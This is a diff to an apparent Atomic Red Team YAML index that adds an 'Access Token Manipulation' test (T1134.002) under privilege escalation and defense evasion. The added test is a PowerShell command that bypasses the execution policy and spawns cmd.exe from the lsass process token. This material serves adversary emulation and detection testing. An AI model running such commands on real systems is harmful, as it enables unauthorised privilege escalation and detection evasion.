@@ -11861,7 +11861,31 @@ privilege-escalation:
       - 'Command: Command Execution'
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1134.002
+    atomic_tests:
+    - name: Access Token Manipulation
+      auto_generated_guid: dbf4f5a9-b8e0-46a3-9841-9ad71247239e
+      description: "This Action demonstrates how an access token for a specific program
+        can spawn another program under a different owner. \nAdversaries can leverage
+        access tokens to run programs under a different user not only to achieve privilege
+        escalation but also to evade detection by blending in with normal user activity.
+        \nThis Action will query all processes and list the process name and owner.It
+        will then make a copy of an existing token to create a new instance of cmd.exe\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          Set-ExecutionPolicy -Scope Process Bypass -Force
+          $owners = @{}
+          gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
+          Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+          Set-Location $PathToAtomicsFolder
+          .\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
+        cleanup_command: 'taskkill /im cmd.exe /f
+
+'
+        name: powershell
+        elevation_required: true
   T1543:
     technique:
       external_references:
@@ -22302,7 +22326,31 @@ defense-evasion:
       - 'Command: Command Execution'
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1134.002
+    atomic_tests:
+    - name: Access Token Manipulation
+      auto_generated_guid: dbf4f5a9-b8e0-46a3-9841-9ad71247239e
+      description: "This Action demonstrates how an access token for a specific program
+        can spawn another program under a different owner. \nAdversaries can leverage
+        access tokens to run programs under a different user not only to achieve privilege
+        escalation but also to evade detection by blending in with normal user activity.
+        \nThis Action will query all processes and list the process name and owner.It
+        will then make a copy of an existing token to create a new instance of cmd.exe\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          Set-ExecutionPolicy -Scope Process Bypass -Force
+          $owners = @{}
+          gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
+          Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+          Set-Location $PathToAtomicsFolder
+          .\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
+        cleanup_command: 'taskkill /im cmd.exe /f
+
+'
+        name: powershell
+        elevation_required: true
   T1578.001:
     technique:
       external_references:
